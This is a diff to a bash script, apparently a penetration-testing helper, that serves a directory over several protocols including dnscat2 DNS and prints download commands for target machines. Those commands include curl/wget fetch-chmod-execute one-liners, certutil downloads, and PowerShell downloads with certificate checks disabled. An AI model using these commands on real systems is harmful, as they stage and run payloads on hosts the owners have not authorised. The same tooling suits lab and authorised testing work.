@@ -1,10 +1,11 @@
 #!/usr/bin/env bash
 # serve_local.sh
-# Serve current directory with multiple protocols (HTTP, SMB, FTP, TFTP, WebDAV, DNS).
+# Serve current directory with multiple protocols (HTTP, HTTPS, SMB, FTP, TFTP, WebDAV, DNS).
 # Prints download commands for each selected file.
 set -euo pipefail
 
 PORT=80
+HTTPS_PORT=443
 WEBDAV_PORT=8080
 INTERFACE=""
 VSFTPD_CONF=""
@@ -40,34 +41,28 @@ if [[ -n "$INTERFACE" ]]; then
     exit 1
   fi
 else
-  # Try tun0 first
-  LOCAL_IP="$(get_ip "tun0")"
-  if [[ -z "$LOCAL_IP" ]]; then
-    echo "tun0 not found. Please select an interface:"
-    # List all interfaces with IPv4 addresses, excluding lo
-    mapfile -t IFACES < <(ip -o -4 addr show | awk '{print $2}' | grep -v 'lo' | sort -u)
-    
-    if [[ ${#IFACES[@]} -eq 0 ]]; then
-      echo "ERROR: No active network interfaces with IPv4 addresses found."
-      exit 1
-    fi
-
-    for i in "${!IFACES[@]}"; do
-      echo "  [$((i+1))] ${IFACES[$i]} ($(get_ip "${IFACES[$i]}"))"
-    done
-
-    while true; do
-      read -p "Enter number to select interface: " iface_idx
-      if [[ "$iface_idx" =~ ^[0-9]+$ ]] && (( iface_idx >= 1 && iface_idx <= ${#IFACES[@]} )); then
-        INTERFACE="${IFACES[$((iface_idx-1))]}"
-        LOCAL_IP="$(get_ip "$INTERFACE")"
-        break
-      fi
-      echo "Invalid selection."
-    done
-  else
-    INTERFACE="tun0"
+  echo "Please select an interface:"
+  # List all interfaces with IPv4 addresses, excluding lo
+  mapfile -t IFACES < <(ip -o -4 addr show | awk '{print $2}' | grep -v 'lo' | sort -u)
+  
+  if [[ ${#IFACES[@]} -eq 0 ]]; then
+    echo "ERROR: No active network interfaces with IPv4 addresses found."
+    exit 1
   fi
+
+  for i in "${!IFACES[@]}"; do
+    echo "  [$((i+1))] ${IFACES[$i]} ($(get_ip "${IFACES[$i]}"))"
+  done
+
+  while true; do
+    read -p "Enter number to select interface: " iface_idx
+    if [[ "$iface_idx" =~ ^[0-9]+$ ]] && (( iface_idx >= 1 && iface_idx <= ${#IFACES[@]} )); then
+      INTERFACE="${IFACES[$((iface_idx-1))]}"
+      LOCAL_IP="$(get_ip "$INTERFACE")"
+      break
+    fi
+    echo "Invalid selection."
+  done
 fi
 
 echo "Using interface $INTERFACE with IP: $LOCAL_IP"
@@ -125,22 +120,24 @@ PROTOCOL=""
 while true; do
   echo "Select Protocol:"
   echo "  [1] HTTP only"
-  echo "  [2] SMB only"
-  echo "  [3] FTP only"
-  echo "  [4] TFTP only"
-  echo "  [5] WebDAV only"
-  echo "  [6] DNS (dnscat2) only"
-  echo "  [7] ALL Protocols (HTTP, SMB, FTP, TFTP, WebDAV, DNS)"
+  echo "  [2] HTTPS only (requires goshs)"
+  echo "  [3] SMB only"
+  echo "  [4] FTP only"
+  echo "  [5] TFTP only"
+  echo "  [6] WebDAV only"
+  echo "  [7] DNS (dnscat2) only"
+  echo "  [8] ALL Protocols (HTTP, HTTPS, SMB, FTP, TFTP, WebDAV, DNS)"
   read -p "Enter number to select protocol: " proto_selection
   case "$proto_selection" in
     1) PROTOCOL="HTTP"; break ;;
-    2) PROTOCOL="SMB"; break ;;
-    3) PROTOCOL="FTP"; break ;;
-    4) PROTOCOL="TFTP"; break ;;
-    5) PROTOCOL="WebDAV"; break ;;
-    6) PROTOCOL="DNS"; break ;;
-    7) PROTOCOL="ALL"; break ;;
-    *) echo "Invalid selection. Please enter 1-7." ;;
+    2) PROTOCOL="HTTPS"; break ;;
+    3) PROTOCOL="SMB"; break ;;
+    4) PROTOCOL="FTP"; break ;;
+    5) PROTOCOL="TFTP"; break ;;
+    6) PROTOCOL="WebDAV"; break ;;
+    7) PROTOCOL="DNS"; break ;;
+    8) PROTOCOL="ALL"; break ;;
+    *) echo "Invalid selection. Please enter 1-8." ;;
   esac
 done
 echo "Selected Protocol: $PROTOCOL"
@@ -152,6 +149,14 @@ if [[ "$PROTOCOL" == "HTTP" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
     echo "WARNING: Port $PORT is privileged and you are not root."
     PORT=8000
     echo "Falling back to port $PORT for HTTP."
+  fi
+fi
+
+if [[ "$PROTOCOL" == "HTTPS" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
+  if [[ "$HTTPS_PORT" -lt 1024 ]] && [[ "$EUID" -ne 0 ]]; then
+    echo "WARNING: Port $HTTPS_PORT is privileged and you are not root."
+    HTTPS_PORT=8443
+    echo "Falling back to port $HTTPS_PORT for HTTPS."
   fi
 fi
 
@@ -176,6 +181,11 @@ else
         echo "  Linux (HTTP):"
         echo "    curl -fsSL \"http://$LOCAL_IP:$PORT/$url_encoded\" -o \"$f\" && chmod +x \"$f\" && ./\"$f\""
         echo "    wget -q --show-progress -O \"$f\" \"http://$LOCAL_IP:$PORT/$url_encoded\" && chmod +x \"$f\" && ./\"$f\""
+      fi
+      if [[ "$PROTOCOL" == "HTTPS" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
+        echo "  Linux (HTTPS - insecure):"
+        echo "    curl -k -fsSL \"https://$LOCAL_IP:$HTTPS_PORT/$url_encoded\" -o \"$f\" && chmod +x \"$f\" && ./\"$f\""
+        echo "    wget --no-check-certificate -q --show-progress -O \"$f\" \"https://$LOCAL_IP:$HTTPS_PORT/$url_encoded\" && chmod +x \"$f\" && ./\"$f\""
       fi
       if [[ "$PROTOCOL" == "SMB" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
         echo "  Linux (SMB):"
@@ -204,16 +214,23 @@ else
       if [[ "$PROTOCOL" == "HTTP" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
         echo "  Windows (HTTP):"
         echo "    certutil -urlcache -split -f \"http://$LOCAL_IP:$PORT/$url_encoded\" \"$f\""
-        echo "    curl \"http://$LOCAL_IP:$PORT/$url_encoded\" -o \"$f\""
+        echo "    curl.exe \"http://$LOCAL_IP:$PORT/$url_encoded\" -o \"$f\""
         echo "    PowerShell -Command \"iwr 'http://$LOCAL_IP:$PORT/$url_encoded' -OutFile '$f'\""
+      fi
+      if [[ "$PROTOCOL" == "HTTPS" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
+        echo "  Windows (HTTPS - insecure):"
+        echo "    curl.exe -k \"https://$LOCAL_IP:$HTTPS_PORT/$url_encoded\" -o \"$f\""
+        # We use single quotes for echo to prevent bash expansion of $true, and double quotes for PowerShell -Command
+        echo "    PowerShell -Command \"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor 3072 -bor 768; [Net.ServicePointManager]::ServerCertificateValidationCallback = {\$true}; (New-Object System.Net.WebClient).DownloadFile('https://$LOCAL_IP:$HTTPS_PORT/$url_encoded', '$f')\""
+        echo "    PowerShell -Command \"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; [Net.ServicePointManager]::ServerCertificateValidationCallback = {\$true}; iwr 'https://$LOCAL_IP:$HTTPS_PORT/$url_encoded' -OutFile '$f'\""
       fi
       if [[ "$PROTOCOL" == "SMB" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
         echo "  Windows (SMB):"
-        echo "    copy \"\\\\$LOCAL_IP\\share\\$f\" ."
+        echo "    net use \\\\$LOCAL_IP\\share /user:smbuser smbpass; cmd.exe /c copy \"\\\\$LOCAL_IP\\share\\$f\" ."
       fi
       if [[ "$PROTOCOL" == "FTP" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
         echo "  Windows (FTP):"
-        echo "    curl \"ftp://$LOCAL_IP/$url_encoded\" -o \"$f\""
+        echo "    curl.exe \"ftp://$LOCAL_IP/$url_encoded\" -o \"$f\""
         echo "    PowerShell -Command \"(New-Object System.Net.WebClient).DownloadFile('ftp://$LOCAL_IP/$f', '$f')\""
       fi
       if [[ "$PROTOCOL" == "TFTP" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
@@ -222,8 +239,9 @@ else
       fi
       if [[ "$PROTOCOL" == "WebDAV" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
         echo "  Windows (WebDAV):"
-        echo "    copy \"\\\\$LOCAL_IP@$WEBDAV_PORT\\DavWWWRoot\\$f\" ."
-        echo "    net use Z: http://$LOCAL_IP:$WEBDAV_PORT/"
+        echo "    (If service error: net start webclient)"
+        echo "    cmd.exe /c copy \"\\\\$LOCAL_IP@$WEBDAV_PORT\\DavWWWRoot\\$f\" ."
+        echo "    net use Z: \"\\\\$LOCAL_IP@$WEBDAV_PORT\\DavWWWRoot\""
       fi
       if [[ "$PROTOCOL" == "DNS" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
         echo "  Windows (DNS/dnscat2):"
@@ -240,16 +258,14 @@ echo "Starting server(s)..."
 
 cleanup() {
   echo "Cleaning up..."
-  # Kill background jobs by sending SIGKILL to their process group if possible
   kill $(jobs -p) 2>/dev/null || true
-  # Also handle cases where jobs might have started sub-processes
   [[ -n "$VSFTPD_CONF" && -f "$VSFTPD_CONF" ]] && rm -f "$VSFTPD_CONF"
 }
 trap cleanup EXIT
 
 start_http() {
   if command -v goshs >/dev/null 2>&1; then
-    echo "Starting goshs server on port $PORT"
+    echo "Starting goshs HTTP server on port $PORT"
     goshs -p "$PORT"
   elif command -v python3 >/dev/null 2>&1; then
     echo "WARNING: 'goshs' not found. Falling back to 'python3 -m http.server'."
@@ -261,13 +277,23 @@ start_http() {
   fi
 }
 
+start_https() {
+  if command -v goshs >/dev/null 2>&1; then
+    echo "Starting goshs HTTPS server on port $HTTPS_PORT (self-signed)"
+    goshs -s -ss -p "$HTTPS_PORT"
+  else
+    echo "ERROR: 'goshs' is required for HTTPS. (go install github.com/patrickhener/goshs@latest)"
+    return 1
+  fi
+}
+
 start_smb() {
   if command -v impacket-smbserver >/dev/null 2>&1; then
-    echo "Starting impacket-smbserver (share: share, path: $(pwd))"
-    impacket-smbserver share "$(pwd)" -smb2support
+    echo "Starting impacket-smbserver (share: share, user: smbuser, pass: smbpass)"
+    impacket-smbserver share "$(pwd)" -smb2support -username smbuser -password smbpass
   elif command -v smbserver.py >/dev/null 2>&1; then
-    echo "Starting smbserver.py (share: share, path: $(pwd))"
-    smbserver.py share "$(pwd)" -smb2support
+    echo "Starting smbserver.py (share: share, user: smbuser, pass: smbpass)"
+    smbserver.py share "$(pwd)" -smb2support -username smbuser -password smbpass
   else
     echo "ERROR: 'impacket-smbserver' not found. (pip install impacket)"
     return 1
@@ -329,19 +355,22 @@ if [[ "$EUID" -eq 0 ]] && command -v fuser >/dev/null 2>&1; then
   echo "Pre-cleaning ports..."
   case "$PROTOCOL" in
     HTTP) fuser -k 80/tcp 2>/dev/null || true ;;
+    HTTPS) fuser -k 443/tcp 2>/dev/null || true ;;
     SMB)  fuser -k 445/tcp 2>/dev/null || true ;;
     FTP)  fuser -k 21/tcp 2>/dev/null || true ;;
     TFTP) fuser -k 69/udp 2>/dev/null || true ;;
     WebDAV) fuser -k 8080/tcp 2>/dev/null || true ;;
     DNS)  fuser -k 53/udp 53/tcp 2>/dev/null || true ;;
     ALL)
-      fuser -k 80/tcp 445/tcp 21/tcp 69/udp 8080/tcp 53/udp 53/tcp 2>/dev/null || true
+      fuser -k 80/tcp 443/tcp 445/tcp 21/tcp 69/udp 8080/tcp 53/udp 53/tcp 2>/dev/null || true
       ;;
   esac
+  sleep 1 # Give the OS a second to release the sockets
 fi
 
 case "$PROTOCOL" in
   HTTP)   start_http ;;
+  HTTPS)  start_https ;;
   SMB)    start_smb ;;
   FTP)    start_ftp ;;
   TFTP)   start_tftp ;;
@@ -350,6 +379,7 @@ case "$PROTOCOL" in
   ALL)
     echo "Attempting to start all servers..."
     (start_http || true) &
+    (start_https || true) &
     (start_smb || true) &
     (start_ftp || true) &
     (start_tftp || true) &
